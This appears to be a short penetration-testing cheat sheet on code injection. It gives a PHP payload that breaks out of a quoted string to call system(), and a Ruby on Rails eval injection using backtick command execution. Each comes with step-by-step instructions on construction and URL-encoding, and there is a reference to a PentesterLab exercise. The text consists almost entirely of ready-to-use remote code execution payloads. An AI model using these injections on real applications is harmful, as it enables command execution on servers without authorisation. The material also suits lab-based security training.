PHP:
1. Using string concatenation to execute code
Lets say you have a code like
<?php
system("ls")
?>
You can exploit the following with concatenation, with the following payload, the quote in the beginning is to end the previous command:
".system('ls')";#

Note: Url encode endline character and hash sign


Ruby on rails:
Always remember --> EVAL IS EVIL

1. RCE via EVAL
Reference:https://pentesterlab.com/exercises/codexec_05/course

Inject the following in the parameter:

myuser"+`uname`+"

Here, we will need to do the following:

    A double-quote " to break out of the string.
    Add a + sign for string concatenation (don't forget to URL-encode it)
    Add a call to the command ([COMMAND]) we want to run using `[COMMAND]`.
    Add another + sign for string concatenation.
    Another double-quote " to close the one that was already there.
